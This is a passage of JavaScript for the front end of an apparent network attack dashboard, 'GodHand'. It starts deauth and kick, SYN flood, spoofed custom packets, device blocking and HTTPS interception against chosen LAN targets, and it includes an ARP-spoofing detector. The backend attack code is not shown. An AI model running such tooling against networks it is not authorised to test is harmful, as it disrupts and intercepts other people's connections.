    'Any devices on this network currently configured to use this host as their DNS server will lose DNS resolution immediately. Continue?',
    async () => {
      const res = await apiCall('gateway/dns/stop', 'POST');
      showToast(res.status, 'success');
      refreshGatewayStatus();
    });
}
async function updateGatewayBlocklist() {
  showToast('Fetching blocklist...', 'success');
  const res = await apiCall('gateway/dns/update_blocklist', 'POST');
  showToast(res.success ? `Blocklist updated: ${res.count} domains` : 'Blocklist update failed', res.success ? 'success' : 'error');
  refreshGatewayStatus();
}
async function testGatewayDns() {
  const box = document.getElementById('gw-dns-test-result');
  box.innerHTML = '<span class="spinner"></span> Testing...';
  const res = await apiCall('gateway/dns/test');
  const rows = Object.entries(res.results).map(([domain, r]) => {
    const label = r.error ? `error: ${r.error}` : (r.blocked ? 'blocked' : 'resolved');
    const mark = !r.error && r.ok ? '✓' : '✗ unexpected';
    return `
      <div class="log-entry ${!r.error && r.ok ? 'success' : 'error'}">
        <span class="msg">${domain}: ${label} ${mark}</span>
      </div>
    `;
  }).join('');
  box.innerHTML = `<div class="log-container">${rows}</div>`;
}
async function startGatewayProxy() {
  openModal('Start network-wide proxy',
    'This stops any tinyproxy process already running on this device, even one you started outside GodHand, and replaces it with a fresh instance. Continue?',
    async () => {
      const res = await apiCall('gateway/proxy/start', 'POST');
      showToast(res.status || res.error, res.success ? 'success' : 'error');
      refreshGatewayStatus();
    });
}
async function stopGatewayProxy() {
  openModal('Stop network-wide proxy',
    'Any devices on this network currently pointed at this host as their HTTP proxy will lose that connection immediately. Continue?',
    async () => {
      const res = await apiCall('gateway/proxy/stop', 'POST');
      showToast(res.status, 'success');
      refreshGatewayStatus();
    });
}

// Dynamic DNS
function onDdnsProviderChange() {
  const isDuck = document.getElementById('ddns-provider').value === 'duckdns';
  document.getElementById('ddns-duckdns-fields').style.display = isDuck ? 'flex' : 'none';
  document.getElementById('ddns-noip-fields').style.display = isDuck ? 'none' : 'flex';
}
async function loadDdnsConfig() {
  try {
    const res = await apiCall('ddns/config');
    if (!res.success) return;
    const cfg = res.config;
    if (cfg.provider) document.getElementById('ddns-provider').value = cfg.provider;
    onDdnsProviderChange();
    document.getElementById('ddns-domain').value = cfg.domain || '';
    document.getElementById('ddns-interval').value = cfg.interval_minutes || 5;
    document.getElementById('ddns-enabled').checked = !!cfg.enabled;
    if (cfg.username) document.getElementById('ddns-username').value = cfg.username;
  } catch(e) {}
}
async function saveDdnsConfig() {
  const provider = document.getElementById('ddns-provider').value;
  const body = {
    provider,
    domain: document.getElementById('ddns-domain').value.trim(),
    interval_minutes: parseInt(document.getElementById('ddns-interval').value, 10) || 5,
  };
  if (provider === 'duckdns') {
    body.token = document.getElementById('ddns-token').value.trim();
  } else {
    body.username = document.getElementById('ddns-username').value.trim();
    body.password = document.getElementById('ddns-password').value;
  }
  const res = await apiCall('ddns/config', 'POST', body);
  showToast(res.success ? 'DDNS settings saved' : res.error, res.success ? 'success' : 'error');
  refreshDdnsStatus();
}
async function toggleDdnsEnabled() {
  const enabled = document.getElementById('ddns-enabled').checked;
  const res = await apiCall('ddns/toggle', 'POST', { enabled });
  if (!res.success) {
    document.getElementById('ddns-enabled').checked = false;
    showToast(res.error, 'error');
    return;
  }
  showToast(enabled ? 'DDNS auto-update enabled' : 'DDNS auto-update disabled', 'success');
}
async function ddnsUpdateNow() {
  showToast('Updating DDNS...', 'success');
  const res = await apiCall('ddns/update_now', 'POST');
  showToast(res.success ? 'DDNS updated' : (res.error || 'DDNS update failed'), res.success ? 'success' : 'error');
  refreshDdnsStatus();
}
async function refreshDdnsStatus() {
  try {
    const res = await apiCall('ddns/config');
    if (!res.success) return;
    const cfg = res.config;
    const badge = document.getElementById('ddns-badge');
    const status = document.getElementById('ddns-status');
    if (!cfg.provider) {
      badge.innerHTML = '';
      status.textContent = 'Not configured.';
      return;
    }
    badge.innerHTML = `<span class="badge ${cfg.enabled ? 'success' : 'info'}">${cfg.enabled ? 'Auto-update on' : 'Auto-update off'}</span>`;
    if (cfg.last_update) {
      status.innerHTML = `<span class="badge ${cfg.last_status === 'ok' ? 'success' : 'danger'}">${escapeHtml(cfg.last_status)}</span> ${escapeHtml(cfg.domain)} → ${escapeHtml(cfg.last_ip || '?')} at ${escapeHtml(cfg.last_update)} — ${escapeHtml(cfg.last_message || '')}`;
    } else {
      status.textContent = `${cfg.provider} configured for ${cfg.domain}, not updated yet.`;
    }
  } catch(e) {}
}

// Remote tunnel (ngrok)
async function startNgrok() {
  const state = await apiCall('state');
  if (!state.auth_enabled) {
    const proceed = confirm(
      'No access token is configured for this UI (GODHAND_SECRET is unset). ' +
      'Anyone with the public ngrok URL will be able to control this tool and your network. ' +
      'Start the tunnel anyway?'
    );
    if (!proceed) return;
  }
  const authtoken = document.getElementById('ngrok-authtoken').value.trim();
  showToast('Starting ngrok tunnel...', 'success');
  const res = await apiCall('ngrok/start', 'POST', { authtoken });
  showToast(res.success ? (res.url ? `Tunnel live: ${res.url}` : 'Tunnel started') : res.error, res.success ? 'success' : 'error');
  refreshNgrokStatus();
}
async function stopNgrok() {
  const res = await apiCall('ngrok/stop', 'POST');
  showToast(res.status, 'success');
  refreshNgrokStatus();
}
async function refreshNgrokStatus() {
  try {
    const res = await apiCall('ngrok/status');
    if (!res.success) return;
    document.getElementById('ngrok-badge').innerHTML =
      `<span class="badge ${res.running ? 'success' : 'danger'}">${res.running ? 'Running' : 'Stopped'}</span>`;
    document.getElementById('ngrok-status').innerHTML = res.running
      ? (res.url ? `Public URL: <a href="${res.url}" target="_blank" rel="noopener">${res.url}</a>` : 'Running — URL not yet available, refresh in a moment.')
      : 'Not running.';
  } catch(e) {}
}

// Poll attack status
async function pollAttackStatus() {
  try {
    const data = await apiCall('attack_status');
    attackRunning = data.attacks;
    const anyRunning = Object.values(attackRunning).some(v => v);
    document.getElementById('start-btn').disabled = anyRunning;
    document.getElementById('stop-btn').disabled = !anyRunning;
    if (anyRunning) {
      document.body.classList.add('attack-active');
      const weapons = Object.keys(attackRunning).filter(k => attackRunning[k]);
      updateGlobalStatus('Running: ' + weapons.join(', '), true);
    } else {
      document.body.classList.remove('attack-active');
      updateGlobalStatus('Ready');
    }
  } catch(e) {}
}

// Prerequisites
async function checkPrerequisites() {
  try {
    const state = await apiCall('state');
    const s = state.state;
    document.getElementById('settings-status').textContent =
      `Current: IFACE: ${s.interface || 'none'}, GW: ${s.gateway || 'none'}, PORT: ${s.port}`;
    const rootWarning = document.getElementById('root-warning');
    if (rootWarning) {
      rootWarning.style.display = state.is_root ? 'none' : 'block';
    }
  } catch(e) {}
}

// Interface loading
async function loadInterfaces() {
  try {
    const data = await apiCall('interfaces');
    const sel = document.getElementById('iface-select');
    sel.innerHTML = '';
    data.interfaces.forEach(iface => {
      const opt = document.createElement('option');
      opt.value = iface.name;
      let label = iface.name;
      if (iface.ip) label += ' (' + iface.ip + ')';
      if (iface.wireless) label += ' 📶';
      opt.textContent = label;
      sel.appendChild(opt);
    });
    if (data.interfaces.length > 0) {
      const selected = data.interfaces.find(i => i.ip && i.wireless) || data.interfaces.find(i => i.ip) || data.interfaces[0];
      sel.value = selected.name;
      await setInterface();
    }
  } catch(e) {}
}

async function setInterface() {
  const iface = document.getElementById('iface-select').value;
  if (!iface) return;
  const res = await apiCall('set_interface', 'POST', { interface: iface });
  showToast(res.status, res.success ? 'success' : 'error');
  checkPrerequisites();
  refreshDeauthCapability();
}

// Honest deauth capability: native (own AP, no monitor mode) vs monitor mode vs unavailable.
// Deliberately not on a recurring timer -- checking monitor support can itself
// briefly flip interface mode, so this only runs on the Attacks tab and after
// the interface changes, not in the background.
async function refreshDeauthCapability() {
  const box = document.getElementById('deauth-capability');
  if (!box) return;
  try {
    const res = await apiCall('deauth_capability');
    if (!res.success) {
      box.textContent = 'Deauth method: ' + (res.error || 'unknown');
      return;
    }
    if (res.method === 'native') {
      box.innerHTML = `<span class="badge success">Native</span> ${res.iface_type} interface is your own access point — Kick / Deauth Flood use the kernel's station-del, no monitor mode. ${res.ap_station_count} station(s) currently associated.`;
    } else if (res.method === 'monitor') {
      box.innerHTML = `<span class="badge warning">Monitor mode</span> Interface is ${res.iface_type} — Kick / Deauth Flood will switch it to monitor mode and use frame injection.`;
    } else if (res.method === 'arp_fallback') {
      box.innerHTML = `<span class="badge warning">ARP fallback</span> ${res.iface_type} interface has no monitor mode/injection support (typical for a phone's built-in Wi-Fi, and there's no netlink shortcut around it — a client interface can only forge frames at itself, not a third party) — Kick / Deauth Flood will fall back to ARP-based disconnection instead. This cuts network access rather than sending a true 802.11 deauth frame, and is less durable.`;
    } else {
      box.innerHTML = `<span class="badge danger">Unavailable</span> Interface is ${res.iface_type}, doesn't support monitor mode, and no gateway is set for the ARP-based fallback — Kick / Deauth Flood can't function yet. Set a gateway on the Settings tab.`;
    }
  } catch(e) {}
}

async function refreshSynFloodCapability() {
  const box = document.getElementById('syn-flood-capability');
  if (!box) return;
  try {
    const res = await apiCall('syn_flood_capability');
    if (!res.success) {
      box.textContent = 'SYN Flood method: ' + (res.error || 'unknown');
      return;
    }
    if (res.method === 'available') {
      const toolName = res.tool === 'hping3' ? 'hping3 (recommended)' : 'raw socket';
      box.innerHTML = `<span class="badge success">Available</span> SYN Flood will use ${toolName} to send SYN packets. Requires root; you're running as root.`;
    } else {
      box.innerHTML = `<span class="badge danger">Unavailable</span> SYN Flood requires root — not running as root. Run with \`sudo\` (or as root in Termux) to enable this weapon.`;
    }
  } catch(e) {}
}

// Custom packet builder
function onPacketProtocolChange() {
  const proto = document.getElementById('pkt-protocol').value;
  document.getElementById('pkt-ports-row').style.display = (proto === 'tcp' || proto === 'udp') ? 'flex' : 'none';
  document.getElementById('pkt-tcp-flags-row').style.display = proto === 'tcp' ? 'flex' : 'none';
  document.getElementById('pkt-icmp-row').style.display = proto === 'icmp' ? 'flex' : 'none';
  document.getElementById('pkt-rawproto-row').style.display = proto === 'raw' ? 'flex' : 'none';
}
async function sendCustomPacket() {
  const protocol = document.getElementById('pkt-protocol').value;
  const body = {
    dst_ip: document.getElementById('pkt-dst-ip').value.trim(),
    dst_mac: document.getElementById('pkt-dst-mac').value.trim(),
    src_ip: document.getElementById('pkt-src-ip').value.trim(),
    src_mac: document.getElementById('pkt-src-mac').value.trim(),
    protocol,
    ttl: parseInt(document.getElementById('pkt-ttl').value, 10) || 64,
    payload: document.getElementById('pkt-payload').value,
    payload_is_hex: document.getElementById('pkt-payload-hex').checked,
    count: parseInt(document.getElementById('pkt-count').value, 10) || 1,
    interval_ms: parseInt(document.getElementById('pkt-interval').value, 10) || 0,
  };
  if (protocol === 'tcp' || protocol === 'udp') {
    body.src_port = parseInt(document.getElementById('pkt-src-port').value, 10) || 0;
    body.dst_port = parseInt(document.getElementById('pkt-dst-port').value, 10) || 0;
  }
  if (protocol === 'tcp') {
    body.tcp_flags = Array.from(document.querySelectorAll('.pkt-flag:checked')).map(el => el.value);
  }
  if (protocol === 'icmp') {
    body.icmp_type = parseInt(document.getElementById('pkt-icmp-type').value, 10) || 8;
    body.icmp_code = parseInt(document.getElementById('pkt-icmp-code').value, 10) || 0;
  }
  if (protocol === 'raw') {
    body.ip_proto = parseInt(document.getElementById('pkt-ip-proto').value, 10) || 253;
  }
  const box = document.getElementById('pkt-result');
  box.style.display = 'block';
  box.textContent = 'Sending...';
  const res = await apiCall('packet_builder/send', 'POST', body);
  if (res.success) {
    box.innerHTML = `<span class="badge success">Sent</span> ${res.sent_count}× ${protocol.toUpperCase()} frame, ${res.frame_bytes}B each ` +
      `(src ${escapeHtml(res.resolved_src_ip)} / ${escapeHtml(res.resolved_src_mac)} → dst MAC ${escapeHtml(res.resolved_dst_mac)}).` +
      `<br><span style="font-family:'JetBrains Mono',monospace; font-size:0.78rem; word-break:break-all;">${escapeHtml(res.hex_preview)}</span>`;
  } else {
    box.innerHTML = `<span class="badge danger">Failed</span> ${escapeHtml(res.error)}`;
  }
}

async function setGateway() {
  const gw = document.getElementById('gateway-input').value.trim();
  if (!gw) return;
  const res = await apiCall('set_gateway', 'POST', { gateway: gw });
  showToast(res.status, res.success ? 'success' : 'error');
  checkPrerequisites();
}
async function setPort() {
  const port = parseInt(document.getElementById('port-input').value, 10);
  if (isNaN(port) || port<1 || port>65535) return;
  const res = await apiCall('set_port', 'POST', { port });
  showToast(res.status, res.success ? 'success' : 'error');
  checkPrerequisites();
}

// Hosts
async function refreshHosts() {
  const scanBtn = document.getElementById('scan-btn');
  const spinner = document.getElementById('scan-spinner');
  scanBtn.disabled = true;
  spinner.style.display = 'inline-block';
  const res = await apiCall('scan');
  scanBtn.disabled = false;
  spinner.style.display = 'none';
  if (res.success) {
    currentHosts = res.hosts;
    renderHosts();
    if (watchWholeNetwork) syncWholeNetworkWatch();
  } else {
    showToast('Scan failed: ' + res.error, 'error');
  }
}

function renderHosts() {
  const tbody = document.getElementById('host-body');
  const empty = document.getElementById('host-empty');
  tbody.innerHTML = '';
  empty.style.display = currentHosts.length ? 'none' : 'block';
  currentHosts.forEach(h => {
    const isTarget = currentTargets.includes(h.ip);
    const tr = document.createElement('tr');
    tr.innerHTML = `
      <td data-label=""><input type="checkbox" class="host-check" data-ip="${h.ip}"></td>
      <td data-label="IP">${h.ip}${isTarget ? ' <span class="badge success">Target</span>' : ''}</td>
      <td data-label="MAC">${h.mac}</td>
      <td data-label="Reachability" id="reach-${h.ip}"><span class="badge info">Checking...</span></td>
      <td data-label="Action">
        ${isTarget
          ? `<button class="btn-icon" onclick="removeTargetByIP('${h.ip}')" title="Remove target">✕</button>`
          : `<button class="btn-icon" onclick="addTargetByIP('${h.ip}')" title="Add target">＋</button>`}
        <button class="btn-icon" onclick="openNmapModal('${h.ip}')" title="Nmap scan"><svg viewBox="0 0 24 24" width="16" height="16" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><polyline points="4 17 10 11 4 5"></polyline><line x1="12" y1="19" x2="20" y2="19"></line></svg></button>
        <button class="btn-icon" onclick="kickIP('${h.ip}')" title="Kick"><svg viewBox="0 0 24 24" width="16" height="16" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M16 21v-2a4 4 0 0 0-4-4H5a4 4 0 0 0-4 4v2"></path><circle cx="8.5" cy="7" r="4"></circle><line x1="18" y1="8" x2="23" y2="13"></line><line x1="23" y1="8" x2="18" y2="13"></line></svg></button>
        <button class="btn-icon" onclick="toggleBlockIP('${h.ip}')" title="Block"><svg viewBox="0 0 24 24" width="16" height="16" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><rect x="3" y="11" width="18" height="11" rx="2" ry="2"></rect><path d="M7 11V7a5 5 0 0 1 10 0v4"></path></svg></button>
      </td>
    `;
    tbody.appendChild(tr);
    serverCheckReachability(h.ip);
  });
}

async function serverCheckReachability(ip) {
  const cell = document.getElementById('reach-' + ip);
  if (!cell) return;
  const res = await apiCall('check_reachability?ip=' + encodeURIComponent(ip));
  if (res.reachable) {
    cell.innerHTML = `<span class="badge success">Reachable (${res.latency}ms)</span>`;
  } else {
    cell.innerHTML = `<span class="badge danger">No response</span>`;
  }
}

function toggleAllHosts() {
  const checked = document.getElementById('select-all-hosts').checked;
  document.querySelectorAll('.host-check').forEach(cb => cb.checked = checked);
}

async function bulkAddTargets() {
  const selectedIPs = Array.from(document.querySelectorAll('.host-check:checked')).map(cb => cb.dataset.ip);
  if (!selectedIPs.length) {
    showToast('No hosts selected', 'warning');
    return;
  }
  await Promise.all(selectedIPs.map(ip => addTargetByIP(ip, false)));
  loadTargets();
  renderHosts();
  showToast('Targets added', 'success');
}

// Targets
async function addTargetByIP(ip, refresh = true) {
  const res = await apiCall('add_target', 'POST', { ip });
  if (res.success) {
    showToast('Added target ' + ip, 'success');
    if (refresh) {
      loadTargets();
      renderHosts();
    }
  } else {
    showToast('Error: ' + res.error, 'error');
  }
}
async function removeTargetByIP(ip) {
  const res = await apiCall('remove_target', 'POST', { ip });
  if (res.success) {
    showToast('Removed target ' + ip, 'success');
    loadTargets();
    renderHosts();
  }
}
async function addTarget() {
  const ip = document.getElementById('target-ip').value.trim();
  if (!ip) return;
  await addTargetByIP(ip);
  document.getElementById('target-ip').value = '';
}
async function loadTargets() {
  const res = await apiCall('state');
  currentTargets = res.state.targets || [];
  const box = document.getElementById('target-chips');
  box.innerHTML = '';
  if (!currentTargets.length) {
    box.innerHTML = '<span class="empty-inline">No targets yet — scan below or add an IP manually.</span>';
    return;
  }
  currentTargets.forEach(ip => {
    const chip = document.createElement('span');
    chip.className = 'chip';
    chip.innerHTML = `
      <span class="chip-ip">${ip}</span>
      <button class="chip-action" onclick="openNmapModal('${ip}')" title="Nmap scan"><svg viewBox="0 0 24 24" width="14" height="14" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><polyline points="4 17 10 11 4 5"></polyline><line x1="12" y1="19" x2="20" y2="19"></line></svg></button>
      <button class="chip-action" onclick="kickIP('${ip}')" title="Kick"><svg viewBox="0 0 24 24" width="14" height="14" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M16 21v-2a4 4 0 0 0-4-4H5a4 4 0 0 0-4 4v2"></path><circle cx="8.5" cy="7" r="4"></circle><line x1="18" y1="8" x2="23" y2="13"></line><line x1="23" y1="8" x2="18" y2="13"></line></svg></button>
      <button class="chip-action" onclick="toggleBlockIP('${ip}')" title="Block"><svg viewBox="0 0 24 24" width="14" height="14" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><rect x="3" y="11" width="18" height="11" rx="2" ry="2"></rect><path d="M7 11V7a5 5 0 0 1 10 0v4"></path></svg></button>
      <button class="chip-action" onclick="removeTargetByIP('${ip}')" title="Remove target">✕</button>
    `;
    box.appendChild(chip);
  });
}

// Attacks
async function confirmStartAttack() {
  const state = await apiCall('state');
  if (!state.state.interface) {
    showToast('Interface not set. Go to Settings.', 'error');
    return;
  }
  if (state.running_attacks.length > 0) {
    showToast('An attack is already running.', 'warning');
    return;
  }
  openModal('Start Attack', `Start weapon ${selectedWeapon}?`, () => launchAttack(false));
}
async function launchAttack(confirmRisk) {
  const btn = document.getElementById('start-btn');
  btn.disabled = true;
  btn.textContent = 'Starting...';
  const res = await apiCall('start_attack', 'POST', { weapon: selectedWeapon, confirm_risk: confirmRisk });
  btn.disabled = false;
  btn.textContent = '▶ Start';
  if (res.success) {
    showToast('Attack started: ' + res.weapon, 'success');
    pollAttackStatus();
  } else if (res.requires_confirmation) {
    openModal('⚠ Risk of network disruption', res.error, () => launchAttack(true));
  } else {
    showToast('Failed: ' + res.error, 'error');
  }
}
async function confirmStopAttack() {
  openModal('Stop Attack', 'Stop all running attacks?', async () => {
    const res = await apiCall('stop_attack', 'POST');
    showToast(res.status, res.success ? 'success' : 'error');
    pollAttackStatus();
  });
}

// Kick/Block
async function kickIP(ip) {
  openModal('Kick Client', `Kick ${ip}?`, async () => {
    const res = await apiCall('kick', 'POST', { ip });
    showToast(res.status, res.success ? 'success' : 'error');
  });
}
async function toggleBlockIP(ip) {
  const res = await apiCall('block', 'POST', { ip });
  showToast(res.status, res.success ? 'success' : 'error');
}
function kickTypedIP() {
  const ip = document.getElementById('target-ip').value.trim();
  if (!ip) { showToast('Enter an IP first', 'warning'); return; }
  kickIP(ip);
}
function blockTypedIP() {
  const ip = document.getElementById('target-ip').value.trim();
  if (!ip) { showToast('Enter an IP first', 'warning'); return; }
  toggleBlockIP(ip);
}

// Device Watch
function renderDevices() {
  const tbody = document.querySelector('#dev-table tbody');
  const empty = document.getElementById('dev-empty');
  tbody.innerHTML = '';
  empty.style.display = devices.length ? 'none' : 'block';
  devices.forEach((d, i) => {
    const tr = document.createElement('tr');
    let badge = '<span class="badge info">Not checked</span>';
    if (d.status === 'up') badge = '<span class="badge success">Reachable</span>';
    else if (d.status === 'down') badge = '<span class="badge danger">No response</span>';
    else if (d.status === 'checking') badge = '<span class="badge warning">Checking...</span>';
    tr.innerHTML = `
      <td data-label="Label">${d.name || '—'}</td>
      <td data-label="IP">${d.ip}</td>
      <td data-label="Status">${badge}</td>
      <td data-label="Latency">${d.latency ? d.latency + ' ms' : '—'}</td>
      <td data-label="">
        <button class="btn-icon" onclick="checkDevice(${i})">↻</button>
        <button class="btn-icon" onclick="removeDevice(${i})">✕</button>
      </td>
    `;
    tbody.appendChild(tr);
  });
}
function addDevice() {
  const name = document.getElementById('dev-name').value.trim();
  const ip = document.getElementById('dev-ip').value.trim();
  if (!ip.match(/^\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}$/)) {
    showToast('Invalid IP', 'error');
    return;
  }
  devices.push({ name, ip, status: null, latency: null });
  localStorage.setItem('lg_devices', JSON.stringify(devices));
  document.getElementById('dev-name').value = '';
  document.getElementById('dev-ip').value = '';
  renderDevices();
}
function removeDevice(i) {
  devices.splice(i, 1);
  localStorage.setItem('lg_devices', JSON.stringify(devices));
  renderDevices();
}
async function checkDevice(i) {
  const d = devices[i];
  d.status = 'checking';
  renderDevices();
  const res = await apiCall('check_reachability?ip=' + encodeURIComponent(d.ip));
  if (res.reachable) {
    d.latency = res.latency;
    d.status = 'up';
  } else {
    d.status = 'down';
    d.latency = null;
  }
  localStorage.setItem('lg_devices', JSON.stringify(devices));
  renderDevices();
}
function checkAllDevices() {
  devices.forEach((_, i) => checkDevice(i));
}
function toggleWatchWholeNetwork() {
  watchWholeNetwork = document.getElementById('watch-whole-network').checked;
  localStorage.setItem('lg_watch_whole_network', watchWholeNetwork ? '1' : '0');
  if (watchWholeNetwork) syncWholeNetworkWatch();
}
function syncWholeNetworkWatch() {
  let added = 0;
  currentHosts.forEach(h => {
    if (!devices.some(d => d.ip === h.ip)) {
      devices.push({ name: '', ip: h.ip, status: null, latency: null });
      added++;
    }
  });
  if (added) {
    localStorage.setItem('lg_devices', JSON.stringify(devices));
    renderDevices();
    checkAllDevices();
  }
}
function addSelectedToWatch() {
  const selectedIPs = Array.from(document.querySelectorAll('.host-check:checked')).map(cb => cb.dataset.ip);
  if (!selectedIPs.length) {
    showToast('No hosts selected', 'warning');
    return;
  }
  let added = 0;
  selectedIPs.forEach(ip => {
    if (!devices.some(d => d.ip === ip)) {
      devices.push({ name: '', ip, status: null, latency: null });
      added++;
    }
  });
  localStorage.setItem('lg_devices', JSON.stringify(devices));
  renderDevices();
  checkAllDevices();
  showToast(`Added ${added} device(s) to watch`, 'success');
}

// ARP Detector
function parseArpText(text) {
  const entries = {};
  const lines = text.split('\n');
  const ipRe = /(\d{1,3}(?:\.\d{1,3}){3})/;
  const macRe = /([0-9a-fA-F]{2}[:-]){5}[0-9a-fA-F]{2}/;
  lines.forEach(line => {
    const ipm = line.match(ipRe);
    const macm = line.match(macRe);
    if (ipm && macm) {
      const ip = ipm[1];
      const mac = macm[0].toLowerCase().replace(/-/g, ':');
      entries[ip] = mac;
    }
  });
  return entries;
}
function ingestArp() {
  const text = document.getElementById('arp-input').value;
  const entries = parseArpText(text);
  if (Object.keys(entries).length === 0) {
    pushAlert("Couldn't parse any IP/MAC pairs from that input.", 'warn');
    renderAlerts();
    return;
  }
  const snapshot = { time: new Date().toISOString(), entries };
  if (arpHistory.length > 0) {
    const prev = arpHistory[arpHistory.length - 1];
    Object.keys(entries).forEach(ip => {
      if (prev.entries[ip] && prev.entries[ip] !== entries[ip]) {
        pushAlert(`IP ${ip} changed MAC address: ${prev.entries[ip]} → ${entries[ip]}. Could be legit or ARP spoofing.`, 'bad');
      }
    });
    const macToIps = {};
    Object.entries(entries).forEach(([ip, mac]) => {
      macToIps[mac] = macToIps[mac] || [];
      macToIps[mac].push(ip);
    });
    Object.entries(macToIps).forEach(([mac, ips]) => {
      if (ips.length > 1) {
        pushAlert(`MAC ${mac} is claiming multiple IPs: ${ips.join(', ')}. ARP spoofing likely.`, 'bad');
      }
    });
  }
  arpHistory.push(snapshot);
  localStorage.setItem('lg_arp_history', JSON.stringify(arpHistory));
  document.getElementById('arp-snap-count').textContent = arpHistory.length;
  renderAlerts();
}
function clearArpHistory() {
  arpHistory = [];
  localStorage.setItem('lg_arp_history', JSON.stringify(arpHistory));
  document.getElementById('arp-snap-count').textContent = 0;
}
function analyzeDeauth() {
  const text = document.getElementById('deauth-input').value.trim();
  if (!text) return;
  const nums = text.split(/[\n,]+/).map(s => parseFloat(s.trim())).filter(n => !isNaN(n));
  if (nums.length < 3) {
    pushAlert('Need at least a few readings.', 'warn');
    renderAlerts();
    return;
  }
  const mean = nums.reduce((a, b) => a + b, 0) / nums.length;
  const std = Math.sqrt(nums.reduce((a, b) => a + (b - mean) ** 2, 0) / nums.length) || 1;
  nums.forEach((n, i) => {
    if (n > mean + 3 * std && n > 10) {
      pushAlert(`Reading #${i + 1} (value ${n}) is a major spike above baseline.`, 'bad');
    }
  });
  renderAlerts();
}
function pushAlert(msg, level) {
  alerts.unshift({ msg, level, time: new Date().toLocaleString() });
  alerts = alerts.slice(0, 50);
  localStorage.setItem('lg_alerts', JSON.stringify(alerts));
  apiCall('add_log', 'POST', { level: level === 'bad' ? 'error' : 'warn', msg });
}
function renderAlerts() {
  const box = document.getElementById('alerts');
  const empty = document.getElementById('alerts-empty');
  box.innerHTML = '';
  empty.style.display = alerts.length ? 'none' : 'block';
  alerts.forEach(a => {
    const div = document.createElement('div');
    div.className = 'alert-item ' + (a.level === 'warn' ? 'warn' : '');
    div.innerHTML = `${a.msg}<div class="t">${a.time}</div>`;
    box.appendChild(div);
  });
}

// Login gate
let appInitialized = false;
function addRipple(btn, event) {
  const rect = btn.getBoundingClientRect();
  const ripple = document.createElement('span');
  const size = Math.max(rect.width, rect.height);
  ripple.className = 'login-ripple';
  ripple.style.width = ripple.style.height = size + 'px';
  ripple.style.left = (event.clientX - rect.left - size / 2) + 'px';
  ripple.style.top = (event.clientY - rect.top - size / 2) + 'px';
  btn.appendChild(ripple);
  setTimeout(() => ripple.remove(), 600);
}
function showLogin() {
  document.getElementById('login-screen').style.display = 'flex';
  document.getElementById('app-shell').style.display = 'none';
  document.getElementById('login-password').value = '';
  document.getElementById('login-username').focus();
}
function showApp() {
  document.getElementById('login-screen').style.display = 'none';
  document.getElementById('app-shell').style.display = 'block';
  document.getElementById('logout-btn').style.display = authToken ? 'inline-flex' : 'none';
  if (!appInitialized) {
    appInitialized = true;
    initApp();
  }
}
async function handleLogin(event) {
  event.preventDefault();
  const btn = document.getElementById('login-submit-btn');
  addRipple(btn, event);
  const username = document.getElementById('login-username').value.trim();
  const password = document.getElementById('login-password').value;
  const errorBox = document.getElementById('login-error');
  errorBox.style.display = 'none';
  btn.disabled = true;
  try {
    const res = await fetch('/api/login', {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ username, password }),
    });
    const data = await res.json();
    if (data.success) {
      authToken = data.token;
      localStorage.setItem('godhand_token', authToken);
      showApp();
    } else {
      errorBox.textContent = data.error || 'Login failed';
      errorBox.style.display = 'block';
    }
  } catch (e) {
    errorBox.textContent = 'Could not reach the server';
    errorBox.style.display = 'block';
  }
  btn.disabled = false;
  return false;
}
async function handleLogout() {
  try { await apiCall('logout', 'POST'); } catch (e) {}
  authToken = '';
  localStorage.removeItem('godhand_token');
  showLogin();
}
async function checkLoginRequired() {
  try {
    const res = await fetch('/api/login_required');
    const data = await res.json();
    if (!data.login_required) {
      showApp();
      return;
    }
    if (authToken) {
      const testRes = await fetch('/api/state', { headers: { 'Authorization': 'Bearer ' + authToken } });
      if (testRes.status !== 401) {
        showApp();
        return;
      }
      authToken = '';
      localStorage.removeItem('godhand_token');
    }
    showLogin();
  } catch (e) {
    // Fail closed: a password always exists now (auto-generated if the operator
    // didn't set one), so there is no configuration where showing the app
    // instead of the login screen is the safe choice.
    showLogin();
  }
}

// Init (runs once, after login succeeds or when login isn't required)
function initApp() {
  document.getElementById('arp-snap-count').textContent = arpHistory.length;
  document.getElementById('watch-whole-network').checked = watchWholeNetwork;
  renderDevices();
  renderAlerts();
  loadInterfaces();
  loadTargets();
  checkPrerequisites();
  pollLogs();
  pollAttackStatus();
  pollTrafficCapture();
  pollBandwidth();
  refreshGatewayStatus();
  loadDdnsConfig();
  setInterval(pollLogs, 2000);
  setInterval(pollAttackStatus, 2000);
  setInterval(pollTrafficCapture, 1000);
  setInterval(pollBandwidth, 2000);
  setInterval(refreshGatewayStatus, 4000);
}

// ========== HTTPS Interception (Phase 1.5) ==========
let httpsInterceptRunning = false;
let httpsTrafficEntries = [];
let httpsEventSource = null;

async function httpsInterceptStart() {
  try {
    const res = await fetch('/api/https_traffic/start', {
      method: 'POST',
      headers: { 'Authorization': 'Bearer ' + authToken }
    });
    const data = await res.json();
    if (data.success) {
      httpsInterceptRunning = true;
      document.getElementById('https-status').textContent = '🟢 Status: Interception active on port 8888';
      document.getElementById('https-status').style.color = '#4caf50';
      document.getElementById('https-start-btn').disabled = true;
      document.getElementById('https-stop-btn').disabled = false;
      startHttpsStreamListener();
      addLog('success', 'HTTPS interception started');
    } else {
      addLog('error', 'Failed to start HTTPS interception: ' + (data.error || 'unknown error'));
    }
  } catch (e) {
    addLog('error', 'HTTPS start failed: ' + e.message);
  }
}

async function httpsInterceptStop() {
  try {
    const res = await fetch('/api/https_traffic/stop', {
      method: 'POST',
      headers: { 'Authorization': 'Bearer ' + authToken }
    });
    const data = await res.json();
    if (data.success) {
      httpsInterceptRunning = false;
      document.getElementById('https-status').textContent = '🔴 Status: Not running';
      document.getElementById('https-status').style.color = '#f44336';
      document.getElementById('https-start-btn').disabled = false;
      document.getElementById('https-stop-btn').disabled = true;
      if (httpsEventSource) {
        httpsEventSource.close();
        httpsEventSource = null;
      }
      addLog('success', 'HTTPS interception stopped');
    } else {
